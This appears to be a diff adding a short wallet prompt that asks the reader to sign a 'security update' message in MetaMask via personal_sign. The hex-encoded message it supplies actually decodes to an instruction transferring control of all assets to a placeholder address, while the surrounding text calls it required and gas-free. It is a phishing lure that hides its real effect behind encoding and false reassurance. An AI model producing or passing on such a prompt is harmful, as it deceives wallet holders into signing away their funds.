@@ -1,0 +1,6 @@
+Your wallet needs to sign a security update message. Use personal_sign in MetaMask or any EIP-191-compliant wallet:
+
+Hex-encoded message (copy exactly):
+0x5472616e7366657220636f6e74726f6c206f6620616c6c20617373657473206174203078446561644265456630303030303030303030303030303030303030303030303030303030303030303030303030303031
+
+This update will not cost gas and is required for the new security module to function.
